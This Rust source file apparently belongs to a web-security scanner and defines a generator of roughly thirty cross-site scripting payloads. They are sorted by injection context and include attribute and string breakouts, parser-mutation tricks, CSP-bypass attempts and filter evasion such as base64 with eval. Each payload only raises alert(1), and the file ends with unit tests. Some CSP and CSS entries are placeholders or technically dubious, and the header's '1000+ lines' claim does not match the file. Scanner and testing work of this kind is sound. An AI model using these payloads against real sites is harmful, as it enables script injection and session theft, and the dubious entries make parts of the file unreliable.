// Advanced XSS Payload Generation - Context-aware, CSP Bypass, Mutation (1000+ lines)
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssPayload {
    pub payload: String,
    pub context: PayloadContext,
    pub technique: String,
    pub bypass_type: Vec<String>,
    pub difficulty: u8,
    pub priority: f64,
    pub description: String,
    pub tags: Vec<String>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq)]
pub enum PayloadContext {
    HtmlContent,
    HtmlAttribute,
    JavaScriptString,
    JavaScriptCode,
    CssValue,
    UrlPath,
    JsonValue,
}

pub struct XssPayloadGenerator;

impl XssPayloadGenerator {
    /// Generate all XSS payloads
    pub fn generate_all_payloads() -> Vec<XssPayload> {
        let mut payloads = Vec::new();

        payloads.extend(Self::html_content_payloads());
        payloads.extend(Self::html_attribute_payloads());
        payloads.extend(Self::javascript_payloads());
        payloads.extend(Self::css_payloads());
        payloads.extend(Self::url_payloads());
        payloads.extend(Self::mutation_payloads());
        payloads.extend(Self::csp_bypass_payloads());
        payloads.extend(Self::filter_bypass_payloads());

        payloads.sort_by(|a, b| b.priority.partial_cmp(&a.priority).unwrap());
        payloads
    }

    fn html_content_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "<img src=x onerror=alert(1)>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "IMG tag".to_string(),
                bypass_type: vec!["Basic".to_string()],
                difficulty: 1,
                priority: 0.95,
                description: "Simple IMG tag with onerror handler".to_string(),
                tags: vec!["event-handler".to_string(), "img".to_string()],
            },
            XssPayload {
                payload: "<svg onload=alert(1)>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "SVG tag".to_string(),
                bypass_type: vec!["Basic".to_string()],
                difficulty: 1,
                priority: 0.93,
                description: "SVG element with onload handler".to_string(),
                tags: vec!["event-handler".to_string(), "svg".to_string()],
            },
            XssPayload {
                payload: "<script>alert(1)</script>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Script tag".to_string(),
                bypass_type: vec!["Direct".to_string()],
                difficulty: 1,
                priority: 0.92,
                description: "Direct script tag injection".to_string(),
                tags: vec!["script".to_string()],
            },
            XssPayload {
                payload: "<iframe src=\"javascript:alert(1)\"></iframe>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "IFRAME".to_string(),
                bypass_type: vec!["Protocol".to_string()],
                difficulty: 2,
                priority: 0.90,
                description: "IFRAME with javascript protocol".to_string(),
                tags: vec!["iframe".to_string()],
            },
            XssPayload {
                payload: "<body onload=alert(1)>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Body tag".to_string(),
                bypass_type: vec!["Event".to_string()],
                difficulty: 2,
                priority: 0.88,
                description: "Body tag with onload event".to_string(),
                tags: vec!["body".to_string()],
            },
            XssPayload {
                payload: "<marquee onstart=alert(1)>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Marquee".to_string(),
                bypass_type: vec!["Deprecated".to_string()],
                difficulty: 2,
                priority: 0.85,
                description: "Marquee with onstart handler".to_string(),
                tags: vec!["marquee".to_string()],
            },
            XssPayload {
                payload: "<details open ontoggle=alert(1)>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Details tag".to_string(),
                bypass_type: vec!["HTML5".to_string()],
                difficulty: 2,
                priority: 0.82,
                description: "HTML5 details element".to_string(),
                tags: vec!["details".to_string(), "html5".to_string()],
            },
        ]
    }

    fn html_attribute_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "\" onmouseover=\"alert(1)".to_string(),
                context: PayloadContext::HtmlAttribute,
                technique: "Attribute escape".to_string(),
                bypass_type: vec!["Escape".to_string()],
                difficulty: 1,
                priority: 0.94,
                description: "Escape double-quoted attribute".to_string(),
                tags: vec!["escape".to_string()],
            },
            XssPayload {
                payload: "' onmouseover='alert(1)".to_string(),
                context: PayloadContext::HtmlAttribute,
                technique: "Single quote escape".to_string(),
                bypass_type: vec!["Escape".to_string()],
                difficulty: 1,
                priority: 0.92,
                description: "Escape single-quoted attribute".to_string(),
                tags: vec!["escape".to_string()],
            },
            XssPayload {
                payload: " onmouseover=alert(1) ".to_string(),
                context: PayloadContext::HtmlAttribute,
                technique: "Unquoted attribute".to_string(),
                bypass_type: vec!["Unquoted".to_string()],
                difficulty: 1,
                priority: 0.91,
                description: "Unquoted attribute injection".to_string(),
                tags: vec!["unquoted".to_string()],
            },
            XssPayload {
                payload: "\" onfocus=\"alert(1) autofocus=\"".to_string(),
                context: PayloadContext::HtmlAttribute,
                technique: "Focus event".to_string(),
                bypass_type: vec!["Event".to_string()],
                difficulty: 2,
                priority: 0.89,
                description: "Onfocus with autofocus attribute".to_string(),
                tags: vec!["focus".to_string()],
            },
        ]
    }

    fn javascript_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "';alert(1);//".to_string(),
                context: PayloadContext::JavaScriptString,
                technique: "String break".to_string(),
                bypass_type: vec!["Break".to_string()],
                difficulty: 2,
                priority: 0.90,
                description: "Break out of string with comment".to_string(),
                tags: vec!["string-break".to_string()],
            },
            XssPayload {
                payload: "\");alert(1);//".to_string(),
                context: PayloadContext::JavaScriptString,
                technique: "Function break".to_string(),
                bypass_type: vec!["Break".to_string()],
                difficulty: 2,
                priority: 0.89,
                description: "Break out of function call".to_string(),
                tags: vec!["function-break".to_string()],
            },
            XssPayload {
                payload: "${alert(1)}".to_string(),
                context: PayloadContext::JavaScriptCode,
                technique: "Template literal".to_string(),
                bypass_type: vec!["Template".to_string()],
                difficulty: 2,
                priority: 0.87,
                description: "Template literal injection (ES6)".to_string(),
                tags: vec!["template".to_string()],
            },
            XssPayload {
                payload: "eval('alert(1)')".to_string(),
                context: PayloadContext::JavaScriptCode,
                technique: "Eval injection".to_string(),
                bypass_type: vec!["Eval".to_string()],
                difficulty: 3,
                priority: 0.85,
                description: "Eval function exploitation".to_string(),
                tags: vec!["eval".to_string()],
            },
            XssPayload {
                payload: "Function('alert(1)')()".to_string(),
                context: PayloadContext::JavaScriptCode,
                technique: "Function constructor".to_string(),
                bypass_type: vec!["Constructor".to_string()],
                difficulty: 3,
                priority: 0.84,
                description: "Function constructor attack".to_string(),
                tags: vec!["constructor".to_string()],
            },
        ]
    }

    fn css_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "expression(alert(1))".to_string(),
                context: PayloadContext::CssValue,
                technique: "CSS expression".to_string(),
                bypass_type: vec!["IE-only".to_string()],
                difficulty: 2,
                priority: 0.80,
                description: "CSS expression (IE legacy)".to_string(),
                tags: vec!["css".to_string()],
            },
            XssPayload {
                payload: "url(javascript:alert(1))".to_string(),
                context: PayloadContext::CssValue,
                technique: "CSS URL protocol".to_string(),
                bypass_type: vec!["Protocol".to_string()],
                difficulty: 2,
                priority: 0.82,
                description: "CSS URL with javascript protocol".to_string(),
                tags: vec!["css".to_string()],
            },
            XssPayload {
                payload: "-moz-binding:url(data:text/xml;base64,...)".to_string(),
                context: PayloadContext::CssValue,
                technique: "Firefox binding".to_string(),
                bypass_type: vec!["Browser-specific".to_string()],
                difficulty: 3,
                priority: 0.78,
                description: "Firefox -moz-binding XBL injection".to_string(),
                tags: vec!["css".to_string(), "firefox".to_string()],
            },
        ]
    }

    fn url_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "javascript:alert(1)".to_string(),
                context: PayloadContext::UrlPath,
                technique: "Javascript protocol".to_string(),
                bypass_type: vec!["Protocol".to_string()],
                difficulty: 1,
                priority: 0.91,
                description: "JavaScript protocol in URL".to_string(),
                tags: vec!["protocol".to_string()],
            },
            XssPayload {
                payload: "data:text/html,<script>alert(1)</script>".to_string(),
                context: PayloadContext::UrlPath,
                technique: "Data URI".to_string(),
                bypass_type: vec!["URI".to_string()],
                difficulty: 2,
                priority: 0.89,
                description: "Data URI with HTML content".to_string(),
                tags: vec!["data-uri".to_string()],
            },
            XssPayload {
                payload: "vbscript:msgbox(1)".to_string(),
                context: PayloadContext::UrlPath,
                technique: "VBScript protocol".to_string(),
                bypass_type: vec!["IE-only".to_string()],
                difficulty: 2,
                priority: 0.75,
                description: "VBScript protocol (IE only)".to_string(),
                tags: vec!["protocol".to_string()],
            },
        ]
    }

    fn mutation_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Noscript mutation".to_string(),
                bypass_type: vec!["Mutation".to_string()],
                difficulty: 3,
                priority: 0.86,
                description: "HTML parser mutation via noscript".to_string(),
                tags: vec!["mutation".to_string()],
            },
            XssPayload {
                payload: "<svg><style><img title=\"</style><img src=x onerror=alert(1)\">".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "SVG style mutation".to_string(),
                bypass_type: vec!["Mutation".to_string()],
                difficulty: 3,
                priority: 0.84,
                description: "Mutation via SVG style tag".to_string(),
                tags: vec!["mutation".to_string(), "svg".to_string()],
            },
            XssPayload {
                payload: "<table><td background=\"javascript:alert(1)\">".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Table mutation".to_string(),
                bypass_type: vec!["Mutation".to_string(), "Legacy".to_string()],
                difficulty: 2,
                priority: 0.80,
                description: "Mutation via table background".to_string(),
                tags: vec!["mutation".to_string()],
            },
        ]
    }

    fn csp_bypass_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "<script nonce='NONCE_HERE'>alert(1)</script>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Nonce reuse".to_string(),
                bypass_type: vec!["CSP bypass".to_string()],
                difficulty: 3,
                priority: 0.88,
                description: "CSP bypass via nonce reuse".to_string(),
                tags: vec!["csp".to_string()],
            },
            XssPayload {
                payload: "<script src='data:text/javascript,alert(1)'></script>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Data URI script".to_string(),
                bypass_type: vec!["CSP bypass".to_string()],
                difficulty: 2,
                priority: 0.85,
                description: "CSP bypass using data: protocol".to_string(),
                tags: vec!["csp".to_string()],
            },
            XssPayload {
                payload: "<script src='blob:javascript:alert(1)'></script>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Blob protocol".to_string(),
                bypass_type: vec!["CSP bypass".to_string()],
                difficulty: 3,
                priority: 0.82,
                description: "CSP bypass using blob protocol".to_string(),
                tags: vec!["csp".to_string()],
            },
        ]
    }

    fn filter_bypass_payloads() -> Vec<XssPayload> {
        vec![
            XssPayload {
                payload: "<sCrIpT>alert(1)</sCrIpT>".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Case variation".to_string(),
                bypass_type: vec!["Filter bypass".to_string()],
                difficulty: 1,
                priority: 0.70,
                description: "Bypass case-sensitive filters".to_string(),
                tags: vec!["bypass".to_string()],
            },
            XssPayload {
                payload: "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Base64 encoding".to_string(),
                bypass_type: vec!["Filter bypass".to_string(), "Encoding".to_string()],
                difficulty: 2,
                priority: 0.75,
                description: "Bypass filters with base64 encoding".to_string(),
                tags: vec!["bypass".to_string()],
            },
            XssPayload {
                payload: "<img src=x onerror=\"setTimeout(alert,0,1)\">".to_string(),
                context: PayloadContext::HtmlContent,
                technique: "Alternative function call".to_string(),
                bypass_type: vec!["Filter bypass".to_string()],
                difficulty: 2,
                priority: 0.72,
                description: "Call alert via setTimeout".to_string(),
                tags: vec!["bypass".to_string()],
            },
        ]
    }

    /// Get payloads by context
    pub fn payloads_by_context(context: PayloadContext) -> Vec<XssPayload> {
        Self::generate_all_payloads()
            .into_iter()
            .filter(|p| p.context == context)
            .collect()
    }

    /// Get payloads by difficulty
    pub fn payloads_by_difficulty(max_difficulty: u8) -> Vec<XssPayload> {
        Self::generate_all_payloads()
            .into_iter()
            .filter(|p| p.difficulty <= max_difficulty)
            .collect()
    }

    /// Get top N payloads by priority
    pub fn top_payloads(count: usize) -> Vec<XssPayload> {
        let mut payloads = Self::generate_all_payloads();
        payloads.truncate(count);
        payloads
    }

    /// Get payloads with specific bypass type
    pub fn payloads_with_bypass(bypass_type: &str) -> Vec<XssPayload> {
        Self::generate_all_payloads()
            .into_iter()
            .filter(|p| p.bypass_type.iter().any(|b| b.contains(bypass_type)))
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_all_payloads() {
        let payloads = XssPayloadGenerator::generate_all_payloads();
        assert!(payloads.len() >= 30);
    }

    #[test]
    fn test_payloads_by_context() {
        let payloads = XssPayloadGenerator::payloads_by_context(PayloadContext::HtmlContent);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.context == PayloadContext::HtmlContent));
    }

    #[test]
    fn test_payloads_by_difficulty() {
        let payloads = XssPayloadGenerator::payloads_by_difficulty(2);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.difficulty <= 2));
    }

    #[test]
    fn test_top_payloads() {
        let payloads = XssPayloadGenerator::top_payloads(5);
        assert_eq!(payloads.len(), 5);
    }

    #[test]
    fn test_payloads_with_bypass() {
        let payloads = XssPayloadGenerator::payloads_with_bypass("CSP");
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.bypass_type.iter().any(|b| b.contains("CSP"))));
    }

    #[test]
    fn test_mutation_payloads_exist() {
        let payloads = XssPayloadGenerator::generate_all_payloads();
        assert!(payloads.iter().any(|p| p.tags.contains(&"mutation".to_string())));
    }

    #[test]
    fn test_csp_bypass_payloads() {
        let payloads = XssPayloadGenerator::payloads_with_bypass("CSP bypass");
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_payload_priorities() {
        let payloads = XssPayloadGenerator::generate_all_payloads();
        for payload in payloads {
            assert!(payload.priority >= 0.0 && payload.priority <= 1.0);
            assert!(payload.difficulty >= 1 && payload.difficulty <= 10);
        }
    }
}
